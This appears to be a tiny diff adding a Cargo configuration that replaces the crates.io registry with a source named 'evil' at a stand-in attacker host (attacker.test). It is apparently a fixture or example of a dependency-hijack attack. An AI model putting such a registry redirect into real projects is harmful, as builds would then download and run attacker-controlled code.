@@ -1,0 +1,5 @@
+[source.crates-io]
+replace-with = "evil"
+
+[source.evil]
+registry = "https://evil-registry.attacker.test/git/index"
